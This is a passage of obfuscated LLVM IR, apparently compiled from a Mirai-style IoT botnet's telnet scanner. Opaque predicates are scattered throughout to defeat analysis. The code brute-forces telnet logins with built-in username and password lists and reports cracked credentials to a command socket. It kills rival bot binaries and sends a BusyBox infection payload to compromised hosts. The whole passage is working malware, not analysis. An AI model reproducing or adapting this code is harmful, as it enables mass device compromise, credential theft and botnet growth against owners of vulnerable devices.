  %762 = load i32, i32* @y.74
  %763 = sub i32 %761, 1
  %764 = mul i32 %761, %763
  %765 = urem i32 %764, 2
  %766 = icmp eq i32 %765, 0
  %767 = icmp slt i32 %762, 10
  %768 = or i1 %766, %767
  br i1 %768, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %760, label %769, label %808

; <label>:769:                                    ; preds = %originalBBpart2128
  %770 = load i32, i32* @x.73
  %771 = load i32, i32* @y.74
  %772 = sub i32 %770, 1
  %773 = mul i32 %770, %772
  %774 = urem i32 %773, 2
  %775 = icmp eq i32 %774, 0
  %776 = icmp slt i32 %771, 10
  %777 = or i1 %775, %776
  br i1 %777, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %769
  %778 = call i64 @time(i64* null) #5
  %779 = trunc i64 %778 to i32
  %780 = load i32, i32* %6, align 4
  %781 = sext i32 %780 to i64
  %782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %781
  %783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %782, i32 0, i32 7
  store i32 %779, i32* %783, align 16
  %784 = load i32, i32* %6, align 4
  %785 = sext i32 %784 to i64
  %786 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %785
  %787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %786, i32 0, i32 9
  %788 = load i8*, i8** %787, align 8
  %789 = call i32 @contains_fail(i8* %788)
  %790 = icmp ne i32 %789, 0
  %791 = load i32, i32* @x.73
  %792 = load i32, i32* @y.74
  %793 = sub i32 %791, 1
  %794 = mul i32 %791, %793
  %795 = urem i32 %794, 2
  %796 = icmp eq i32 %795, 0
  %797 = icmp slt i32 %792, 10
  %798 = or i1 %796, %797
  br i1 %798, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br i1 %790, label %799, label %803

; <label>:799:                                    ; preds = %originalBBpart2132
  %800 = load i32, i32* %6, align 4
  %801 = sext i32 %800 to i64
  %802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %801
  call void @advance_telstate(%struct.telstate_t* %802, i32 0)
  br label %807

; <label>:803:                                    ; preds = %originalBBpart2132
  %804 = load i32, i32* %6, align 4
  %805 = sext i32 %804 to i64
  %806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %805
  call void @advance_telstate(%struct.telstate_t* %806, i32 5)
  br label %807

; <label>:807:                                    ; preds = %803, %799
  br label %1388

; <label>:808:                                    ; preds = %originalBBpart2128
  %809 = load i32, i32* %6, align 4
  %810 = sext i32 %809 to i64
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %810
  %812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %811, i32 0, i32 7
  %813 = load i32, i32* %812, align 16
  %814 = add i32 %813, 7
  %815 = zext i32 %814 to i64
  %816 = call i64 @time(i64* null) #5
  %817 = icmp slt i64 %815, %816
  br i1 %817, label %818, label %822

; <label>:818:                                    ; preds = %808
  %819 = load i32, i32* %6, align 4
  %820 = sext i32 %819 to i64
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %820
  call void @reset_telstate(%struct.telstate_t* %821)
  br label %822

; <label>:822:                                    ; preds = %818, %808
  %823 = load i32, i32* @x.73
  %824 = load i32, i32* @y.74
  %825 = sub i32 %823, 1
  %826 = mul i32 %823, %825
  %827 = urem i32 %826, 2
  %828 = icmp eq i32 %827, 0
  %829 = icmp slt i32 %824, 10
  %830 = or i1 %828, %829
  br i1 %830, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %822
  %831 = load i32, i32* @x.73
  %832 = load i32, i32* @y.74
  %833 = sub i32 %831, 1
  %834 = mul i32 %831, %833
  %835 = urem i32 %834, 2
  %836 = icmp eq i32 %835, 0
  %837 = icmp slt i32 %832, 10
  %838 = or i1 %836, %837
  br i1 %838, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br label %1387

; <label>:839:                                    ; preds = %122
  %840 = load i32, i32* %6, align 4
  %841 = sext i32 %840 to i64
  %842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %841
  %843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %842, i32 0, i32 0
  %844 = load i32, i32* %843, align 16
  %845 = load i32, i32* %6, align 4
  %846 = sext i32 %845 to i64
  %847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %846
  %848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %847, i32 0, i32 5
  %849 = load i8, i8* %848, align 1
  %850 = zext i8 %849 to i64
  %851 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %850
  %852 = load i8*, i8** %851, align 8
  %853 = load i32, i32* %6, align 4
  %854 = sext i32 %853 to i64
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %854
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %855, i32 0, i32 5
  %857 = load i8, i8* %856, align 1
  %858 = zext i8 %857 to i64
  %859 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %858
  %860 = load i8*, i8** %859, align 8
  %861 = call i64 @strlen(i8* %860) #9
  %862 = call i64 @send(i32 %844, i8* %852, i64 %861, i32 16384)
  %863 = icmp slt i64 %862, 0
  br i1 %863, label %864, label %868

; <label>:864:                                    ; preds = %839
  %865 = load i32, i32* %6, align 4
  %866 = sext i32 %865 to i64
  %867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %866
  call void @reset_telstate(%struct.telstate_t* %867)
  br label %1388

; <label>:868:                                    ; preds = %839
  %869 = load i32, i32* %6, align 4
  %870 = sext i32 %869 to i64
  %871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %870
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %871, i32 0, i32 0
  %873 = load i32, i32* %872, align 16
  %874 = call i64 @send(i32 %873, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.501, i32 0, i32 0), i64 2, i32 16384)
  %875 = icmp slt i64 %874, 0
  br i1 %875, label %876, label %880

; <label>:876:                                    ; preds = %868
  %877 = load i32, i32* %6, align 4
  %878 = sext i32 %877 to i64
  %879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %878
  call void @reset_telstate(%struct.telstate_t* %879)
  br label %1388

; <label>:880:                                    ; preds = %868
  %881 = load i32, i32* @x.73
  %882 = load i32, i32* @y.74
  %883 = sub i32 %881, 1
  %884 = mul i32 %881, %883
  %885 = urem i32 %884, 2
  %886 = icmp eq i32 %885, 0
  %887 = icmp slt i32 %882, 10
  %888 = or i1 %886, %887
  br i1 %888, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %880
  %889 = load i32, i32* %6, align 4
  %890 = sext i32 %889 to i64
  %891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %890
  call void @advance_telstate(%struct.telstate_t* %891, i32 6)
  %892 = load i32, i32* @x.73
  %893 = load i32, i32* @y.74
  %894 = sub i32 %892, 1
  %895 = mul i32 %892, %894
  %896 = urem i32 %895, 2
  %897 = icmp eq i32 %896, 0
  %898 = icmp slt i32 %893, 10
  %899 = or i1 %897, %898
  br i1 %899, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br label %1387

; <label>:900:                                    ; preds = %122
  %901 = load i32, i32* @x.73
  %902 = load i32, i32* @y.74
  %903 = sub i32 %901, 1
  %904 = mul i32 %901, %903
  %905 = urem i32 %904, 2
  %906 = icmp eq i32 %905, 0
  %907 = icmp slt i32 %902, 10
  %908 = or i1 %906, %907
  br i1 %908, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %900
  %909 = load i32, i32* %6, align 4
  %910 = sext i32 %909 to i64
  %911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %910
  %912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %911, i32 0, i32 0
  %913 = load i32, i32* %912, align 16
  %914 = load i32, i32* %3, align 4
  %915 = load i32, i32* %6, align 4
  %916 = sext i32 %915 to i64
  %917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %916
  %918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %917, i32 0, i32 9
  %919 = load i8*, i8** %918, align 8
  %920 = call i32 @read_until_response(i32 %913, i32 %914, i8* %919, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %921 = icmp ne i32 %920, 0
  %922 = load i32, i32* @x.73
  %923 = load i32, i32* @y.74
  %924 = sub i32 %922, 1
  %925 = mul i32 %922, %924
  %926 = urem i32 %925, 2
  %927 = icmp eq i32 %926, 0
  %928 = icmp slt i32 %923, 10
  %929 = or i1 %927, %928
  br i1 %929, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br i1 %921, label %930, label %1049

; <label>:930:                                    ; preds = %originalBBpart2144
  %931 = call i64 @time(i64* null) #5
  %932 = trunc i64 %931 to i32
  %933 = load i32, i32* %6, align 4
  %934 = sext i32 %933 to i64
  %935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %934
  %936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %935, i32 0, i32 7
  store i32 %932, i32* %936, align 16
  %937 = load i32, i32* %6, align 4
  %938 = sext i32 %937 to i64
  %939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %938
  %940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %939, i32 0, i32 9
  %941 = load i8*, i8** %940, align 8
  %942 = call i32 @contains_fail(i8* %941)
  %943 = icmp ne i32 %942, 0
  br i1 %943, label %944, label %948

; <label>:944:                                    ; preds = %930
  %945 = load i32, i32* %6, align 4
  %946 = sext i32 %945 to i64
  %947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %946
  call void @advance_telstate(%struct.telstate_t* %947, i32 0)
  br label %1032

; <label>:948:                                    ; preds = %930
  %949 = load i32, i32* %6, align 4
  %950 = sext i32 %949 to i64
  %951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %950
  %952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %951, i32 0, i32 9
  %953 = load i8*, i8** %952, align 8
  %954 = call i32 @contains_success(i8* %953)
  %955 = icmp ne i32 %954, 0
  br i1 %955, label %956, label %1011

; <label>:956:                                    ; preds = %948
  %957 = load i32, i32* %6, align 4
  %958 = sext i32 %957 to i64
  %959 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %958
  %960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %959, i32 0, i32 3
  %961 = load i8, i8* %960, align 1
  %962 = zext i8 %961 to i32
  %963 = icmp eq i32 %962, 2
  br i1 %963, label %964, label %968

; <label>:964:                                    ; preds = %956
  %965 = load i32, i32* %6, align 4
  %966 = sext i32 %965 to i64
  %967 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %966
  call void @advance_telstate(%struct.telstate_t* %967, i32 7)
  br label %1010

; <label>:968:                                    ; preds = %956
  %969 = load i32, i32* @x.73
  %970 = load i32, i32* @y.74
  %971 = sub i32 %969, 1
  %972 = mul i32 %969, %971
  %973 = urem i32 %972, 2
  %974 = icmp eq i32 %973, 0
  %975 = icmp slt i32 %970, 10
  %976 = or i1 %974, %975
  br i1 %976, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %968
  %977 = load i32, i32* @mainCommSock, align 4
  %978 = load i32, i32* %6, align 4
  %979 = sext i32 %978 to i64
  %980 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %979
  %981 = call i8* @get_telstate_host(%struct.telstate_t* %980)
  %982 = load i32, i32* %6, align 4
  %983 = sext i32 %982 to i64
  %984 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %983
  %985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %984, i32 0, i32 4
  %986 = load i8, i8* %985, align 2
  %987 = zext i8 %986 to i64
  %988 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %987
  %989 = load i8*, i8** %988, align 8
  %990 = load i32, i32* %6, align 4
  %991 = sext i32 %990 to i64
  %992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %991
  %993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %992, i32 0, i32 5
  %994 = load i8, i8* %993, align 1
  %995 = zext i8 %994 to i64
  %996 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %995
  %997 = load i8*, i8** %996, align 8
  %998 = call i32 (i32, i8*, ...) @sockprintf(i32 %977, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.502, i32 0, i32 0), i8* %981, i8* %989, i8* %997)
  %999 = load i32, i32* %6, align 4
  %1000 = sext i32 %999 to i64
  %1001 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1000
  call void @advance_telstate(%struct.telstate_t* %1001, i32 7)
  %1002 = load i32, i32* @x.73
  %1003 = load i32, i32* @y.74
  %1004 = sub i32 %1002, 1
  %1005 = mul i32 %1002, %1004
  %1006 = urem i32 %1005, 2
  %1007 = icmp eq i32 %1006, 0
  %1008 = icmp slt i32 %1003, 10
  %1009 = or i1 %1007, %1008
  br i1 %1009, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br label %1010

; <label>:1010:                                   ; preds = %originalBBpart2148, %964
  br label %1015

; <label>:1011:                                   ; preds = %948
  %1012 = load i32, i32* %6, align 4
  %1013 = sext i32 %1012 to i64
  %1014 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1013
  call void @reset_telstate(%struct.telstate_t* %1014)
  br label %1015

; <label>:1015:                                   ; preds = %1011, %1010
  %1016 = load i32, i32* @x.73
  %1017 = load i32, i32* @y.74
  %1018 = sub i32 %1016, 1
  %1019 = mul i32 %1016, %1018
  %1020 = urem i32 %1019, 2
  %1021 = icmp eq i32 %1020, 0
  %1022 = icmp slt i32 %1017, 10
  %1023 = or i1 %1021, %1022
  br i1 %1023, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1015
  %1024 = load i32, i32* @x.73
  %1025 = load i32, i32* @y.74
  %1026 = sub i32 %1024, 1
  %1027 = mul i32 %1024, %1026
  %1028 = urem i32 %1027, 2
  %1029 = icmp eq i32 %1028, 0
  %1030 = icmp slt i32 %1025, 10
  %1031 = or i1 %1029, %1030
  br i1 %1031, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br label %1032

; <label>:1032:                                   ; preds = %originalBBpart2152, %944
  %1033 = load i32, i32* @x.73
  %1034 = load i32, i32* @y.74
  %1035 = sub i32 %1033, 1
  %1036 = mul i32 %1033, %1035
  %1037 = urem i32 %1036, 2
  %1038 = icmp eq i32 %1037, 0
  %1039 = icmp slt i32 %1034, 10
  %1040 = or i1 %1038, %1039
  br i1 %1040, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1032
  %1041 = load i32, i32* @x.73
  %1042 = load i32, i32* @y.74
  %1043 = sub i32 %1041, 1
  %1044 = mul i32 %1041, %1043
  %1045 = urem i32 %1044, 2
  %1046 = icmp eq i32 %1045, 0
  %1047 = icmp slt i32 %1042, 10
  %1048 = or i1 %1046, %1047
  br i1 %1048, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br label %1388

; <label>:1049:                                   ; preds = %originalBBpart2144
  %1050 = load i32, i32* @x.73
  %1051 = load i32, i32* @y.74
  %1052 = sub i32 %1050, 1
  %1053 = mul i32 %1050, %1052
  %1054 = urem i32 %1053, 2
  %1055 = icmp eq i32 %1054, 0
  %1056 = icmp slt i32 %1051, 10
  %1057 = or i1 %1055, %1056
  br i1 %1057, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1049
  %1058 = load i32, i32* %6, align 4
  %1059 = sext i32 %1058 to i64
  %1060 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1059
  %1061 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1060, i32 0, i32 7
  %1062 = load i32, i32* %1061, align 16
  %1063 = add i32 %1062, 7
  %1064 = zext i32 %1063 to i64
  %1065 = call i64 @time(i64* null) #5
  %1066 = icmp slt i64 %1064, %1065
  %1067 = load i32, i32* @x.73
  %1068 = load i32, i32* @y.74
  %1069 = sub i32 %1067, 1
  %1070 = mul i32 %1067, %1069
  %1071 = urem i32 %1070, 2
  %1072 = icmp eq i32 %1071, 0
  %1073 = icmp slt i32 %1068, 10
  %1074 = or i1 %1072, %1073
  br i1 %1074, label %originalBBpart2171, label %originalBB158alteredBB

originalBBpart2171:                               ; preds = %originalBB158
  br i1 %1066, label %1075, label %1079

; <label>:1075:                                   ; preds = %originalBBpart2171
  %1076 = load i32, i32* %6, align 4
  %1077 = sext i32 %1076 to i64
  %1078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1077
  call void @reset_telstate(%struct.telstate_t* %1078)
  br label %1079

; <label>:1079:                                   ; preds = %1075, %originalBBpart2171
  br label %1387

; <label>:1080:                                   ; preds = %122
  %1081 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1082 = call i32 (i8*, i8*, ...) @sprintf(i8* %1081, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.503, i32 0, i32 0), i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @Temp_Directorys, i32 0, i32 0)) #5
  %1083 = load i32, i32* %6, align 4
  %1084 = sext i32 %1083 to i64
  %1085 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1084
  %1086 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1085, i32 0, i32 0
  %1087 = load i32, i32* %1086, align 16
  %1088 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1089 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1090 = call i64 @strlen(i8* %1089) #9
  %1091 = call i64 @send(i32 %1087, i8* %1088, i64 %1090, i32 16384)
  %1092 = icmp slt i64 %1091, 0
  br i1 %1092, label %1093, label %1097

; <label>:1093:                                   ; preds = %1080
  %1094 = load i32, i32* %6, align 4
  %1095 = sext i32 %1094 to i64
  %1096 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1095
  call void @reset_telstate(%struct.telstate_t* %1096)
  br label %1388

; <label>:1097:                                   ; preds = %1080
  call void @RemoveTempDirs()
  %1098 = load i32, i32* @mainCommSock, align 4
  %1099 = load i32, i32* %6, align 4
  %1100 = sext i32 %1099 to i64
  %1101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1100
  %1102 = call i8* @get_telstate_host(%struct.telstate_t* %1101)
  %1103 = load i32, i32* %6, align 4
  %1104 = sext i32 %1103 to i64
  %1105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1104
  %1106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1105, i32 0, i32 4
  %1107 = load i8, i8* %1106, align 2
  %1108 = zext i8 %1107 to i64
  %1109 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %1108
  %1110 = load i8*, i8** %1109, align 8
  %1111 = load i32, i32* %6, align 4
  %1112 = sext i32 %1111 to i64
  %1113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1112
  %1114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1113, i32 0, i32 5
  %1115 = load i8, i8* %1114, align 1
  %1116 = zext i8 %1115 to i64
  %1117 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %1116
  %1118 = load i8*, i8** %1117, align 8
  %1119 = call i32 (i32, i8*, ...) @sockprintf(i32 %1098, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.504, i32 0, i32 0), i8* %1102, i8* %1110, i8* %1118)
  %1120 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1121 = call i32 (i8*, i8*, ...) @sprintf(i8* %1120, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.505, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0)) #5
  %1122 = load i32, i32* %6, align 4
  %1123 = sext i32 %1122 to i64
  %1124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1123
  %1125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1124, i32 0, i32 0
  %1126 = load i32, i32* %1125, align 16
  %1127 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1128 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1129 = call i64 @strlen(i8* %1128) #9
  %1130 = call i64 @send(i32 %1126, i8* %1127, i64 %1129, i32 16384)
  %1131 = icmp slt i64 %1130, 0
  br i1 %1131, label %1132, label %1152

; <label>:1132:                                   ; preds = %1097
  %1133 = load i32, i32* @x.73
  %1134 = load i32, i32* @y.74
  %1135 = sub i32 %1133, 1
  %1136 = mul i32 %1133, %1135
  %1137 = urem i32 %1136, 2
  %1138 = icmp eq i32 %1137, 0
  %1139 = icmp slt i32 %1134, 10
  %1140 = or i1 %1138, %1139
  br i1 %1140, label %originalBB173, label %originalBB173alteredBB

originalBB173:                                    ; preds = %originalBB173alteredBB, %1132
  %1141 = load i32, i32* %6, align 4
  %1142 = sext i32 %1141 to i64
  %1143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1142
  call void @reset_telstate(%struct.telstate_t* %1143)
  %1144 = load i32, i32* @x.73
  %1145 = load i32, i32* @y.74
  %1146 = sub i32 %1144, 1
  %1147 = mul i32 %1144, %1146
  %1148 = urem i32 %1147, 2
  %1149 = icmp eq i32 %1148, 0
  %1150 = icmp slt i32 %1145, 10
  %1151 = or i1 %1149, %1150
  br i1 %1151, label %originalBBpart2175, label %originalBB173alteredBB

originalBBpart2175:                               ; preds = %originalBB173
  br label %1388

; <label>:1152:                                   ; preds = %1097
  %1153 = load i32, i32* @mainCommSock, align 4
  %1154 = load i32, i32* %6, align 4
  %1155 = sext i32 %1154 to i64
  %1156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1155
  %1157 = call i8* @get_telstate_host(%struct.telstate_t* %1156)
  %1158 = load i32, i32* %6, align 4
  %1159 = sext i32 %1158 to i64
  %1160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1159
  %1161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1160, i32 0, i32 4
  %1162 = load i8, i8* %1161, align 2
  %1163 = zext i8 %1162 to i64
  %1164 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %1163
  %1165 = load i8*, i8** %1164, align 8
  %1166 = load i32, i32* %6, align 4
  %1167 = sext i32 %1166 to i64
  %1168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1167
  %1169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1168, i32 0, i32 5
  %1170 = load i8, i8* %1169, align 1
  %1171 = zext i8 %1170 to i64
  %1172 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %1171
  %1173 = load i8*, i8** %1172, align 8
  %1174 = call i32 (i32, i8*, ...) @sockprintf(i32 %1153, i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.506, i32 0, i32 0), i8* %1157, i8* %1165, i8* %1173)
  %1175 = load i32, i32* %6, align 4
  %1176 = sext i32 %1175 to i64
  %1177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1176
  call void @advance_telstate(%struct.telstate_t* %1177, i32 8)
  br label %1387

; <label>:1178:                                   ; preds = %122
  %1179 = load i32, i32* @x.73
  %1180 = load i32, i32* @y.74
  %1181 = sub i32 %1179, 1
  %1182 = mul i32 %1179, %1181
  %1183 = urem i32 %1182, 2
  %1184 = icmp eq i32 %1183, 0
  %1185 = icmp slt i32 %1180, 10
  %1186 = or i1 %1184, %1185
  br i1 %1186, label %originalBB177, label %originalBB177alteredBB

originalBB177:                                    ; preds = %originalBB177alteredBB, %1178
  %1187 = call i64 @time(i64* null) #5
  %1188 = trunc i64 %1187 to i32
  %1189 = load i32, i32* %6, align 4
  %1190 = sext i32 %1189 to i64
  %1191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1190
  %1192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1191, i32 0, i32 7
  store i32 %1188, i32* %1192, align 16
  %1193 = load i32, i32* %6, align 4
  %1194 = sext i32 %1193 to i64
  %1195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1194
  %1196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1195, i32 0, i32 0
  %1197 = load i32, i32* %1196, align 16
  %1198 = call i64 @send(i32 %1197, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.507, i32 0, i32 0), i64 4, i32 16384)
  %1199 = icmp slt i64 %1198, 0
  %1200 = load i32, i32* @x.73
  %1201 = load i32, i32* @y.74
  %1202 = sub i32 %1200, 1
  %1203 = mul i32 %1200, %1202
  %1204 = urem i32 %1203, 2
  %1205 = icmp eq i32 %1204, 0
  %1206 = icmp slt i32 %1201, 10
  %1207 = or i1 %1205, %1206
  br i1 %1207, label %originalBBpart2179, label %originalBB177alteredBB

originalBBpart2179:                               ; preds = %originalBB177
  br i1 %1199, label %1208, label %1225

; <label>:1208:                                   ; preds = %originalBBpart2179
  %1209 = load i32, i32* @x.73
  %1210 = load i32, i32* @y.74
  %1211 = sub i32 %1209, 1
  %1212 = mul i32 %1209, %1211
  %1213 = urem i32 %1212, 2
  %1214 = icmp eq i32 %1213, 0
  %1215 = icmp slt i32 %1210, 10
  %1216 = or i1 %1214, %1215
  br i1 %1216, label %originalBB181, label %originalBB181alteredBB

originalBB181:                                    ; preds = %originalBB181alteredBB, %1208
  %1217 = load i32, i32* @x.73
  %1218 = load i32, i32* @y.74
  %1219 = sub i32 %1217, 1
  %1220 = mul i32 %1217, %1219
  %1221 = urem i32 %1220, 2
  %1222 = icmp eq i32 %1221, 0
  %1223 = icmp slt i32 %1218, 10
  %1224 = or i1 %1222, %1223
  br i1 %1224, label %originalBBpart2183, label %originalBB181alteredBB

originalBBpart2183:                               ; preds = %originalBB181
  br label %1225

; <label>:1225:                                   ; preds = %originalBBpart2183, %originalBBpart2179
  %1226 = load i32, i32* %6, align 4
  %1227 = sext i32 %1226 to i64
  %1228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1227
  %1229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1228, i32 0, i32 0
  %1230 = load i32, i32* %1229, align 16
  %1231 = call i64 @send(i32 %1230, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.508, i32 0, i32 0), i64 7, i32 16384)
  %1232 = icmp slt i64 %1231, 0
  br i1 %1232, label %1233, label %1234

; <label>:1233:                                   ; preds = %1225
  br label %1234

; <label>:1234:                                   ; preds = %1233, %1225
  %1235 = load i32, i32* %6, align 4
  %1236 = sext i32 %1235 to i64
  %1237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1236
  %1238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1237, i32 0, i32 0
  %1239 = load i32, i32* %1238, align 16
  %1240 = load i8*, i8** @Busybox_Payload, align 8
  %1241 = load i8*, i8** @Busybox_Payload, align 8
  %1242 = call i64 @strlen(i8* %1241) #9
  %1243 = call i64 @send(i32 %1239, i8* %1240, i64 %1242, i32 16384)
  %1244 = icmp slt i64 %1243, 0
  br i1 %1244, label %1245, label %1249

; <label>:1245:                                   ; preds = %1234
  %1246 = load i32, i32* %6, align 4
  %1247 = sext i32 %1246 to i64
  %1248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1247
  call void @reset_telstate(%struct.telstate_t* %1248)
  br label %1388

; <label>:1249:                                   ; preds = %1234
  %1250 = load i32, i32* @mainCommSock, align 4
  %1251 = load i32, i32* %6, align 4
  %1252 = sext i32 %1251 to i64
  %1253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1252
  %1254 = call i8* @get_telstate_host(%struct.telstate_t* %1253)
  %1255 = load i32, i32* %6, align 4
  %1256 = sext i32 %1255 to i64
  %1257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1256
  %1258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1257, i32 0, i32 4
  %1259 = load i8, i8* %1258, align 2
  %1260 = zext i8 %1259 to i64
